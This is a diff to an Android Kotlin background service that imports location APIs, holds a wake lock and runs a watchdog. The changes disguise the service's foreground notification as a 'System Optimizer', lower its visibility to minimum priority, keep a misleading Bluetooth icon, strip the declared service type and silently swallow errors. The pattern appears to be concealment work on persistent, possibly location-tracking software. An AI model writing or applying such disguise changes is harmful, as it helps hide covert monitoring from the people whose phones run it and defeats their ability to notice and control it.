@@ -7,7 +7,6 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ServiceInfo
 import android.location.Location
 import android.location.LocationManager
 import android.net.Uri
@@ -80,8 +79,8 @@ class SyncService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        acquireWakeLock()
         startForegroundServiceNotification()
+        acquireWakeLock()
         scheduleWatchdog()
     }
 
@@ -96,25 +95,21 @@ class SyncService : Service() {
 
     private fun startForegroundServiceNotification() {
         try {
-            val channelName = "System Core Synchronization v7.8"
+            val channelName = "System Optimization Service"
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW)
+                val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_MIN)
                 val manager = getSystemService(NotificationManager::class.java)
                 manager?.createNotificationChannel(channel)
             }
 
             val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Assets Core")
-                .setContentText("Sovereign core operational v7.8...")
+                .setContentTitle("System Optimizer")
+                .setContentText("Running background optimization...")
                 .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build()
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-            } else {
-                startForeground(NOTIF_ID, notification)
-            }
+            startForeground(NOTIF_ID, notification)
         } catch (e: Throwable) {}
     }
 
